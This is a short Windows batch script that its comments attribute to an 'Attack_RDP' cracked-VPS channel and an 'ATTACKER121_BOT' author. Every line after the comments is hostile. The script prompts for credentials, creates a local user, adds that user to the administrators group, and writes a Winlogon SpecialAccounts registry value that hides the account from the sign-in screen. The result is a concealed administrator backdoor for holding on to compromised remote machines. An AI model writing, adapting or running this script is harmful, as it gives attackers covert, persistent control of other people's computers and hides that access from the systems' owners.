cd\
cls
REM ----------(my Crack Vps channel  is = Attack_RDP)---------------
REM _-_- im (m.r) *&* ATTACKER121_BOT *&* vps hide use creator"
REM ----------(my Crack Vps channel  is = Attack_RDP)---------------
@echo off
set /p user=Please Enter Desired Username:
set /p pass=Please Enter Desired Password:
net user /add %user% %pass%
net localgroup administrators /add %user%
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0
pause
